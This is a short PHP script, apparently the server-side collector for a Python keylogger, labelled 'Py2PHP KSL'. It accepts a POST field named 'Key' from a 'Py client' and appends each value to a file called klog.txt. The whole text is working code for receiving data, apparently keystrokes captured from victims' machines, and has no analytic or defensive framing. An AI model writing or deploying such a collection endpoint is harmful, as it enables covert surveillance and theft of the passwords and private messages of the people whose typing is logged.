<!-- Py2PHP KSL -->
<!-- Pythogen -->

<html>
<head>
	<title>Py2PHP Log</title>
</head>
<body>

<?php
	// Variable contains data from Py client.
	$testDat = htmlspecialchars($_POST["Key"]);
	// Append POST data into file.
	echo file_put_contents('klog.txt', $testDat, FILE_APPEND);
?>

</body>
</html>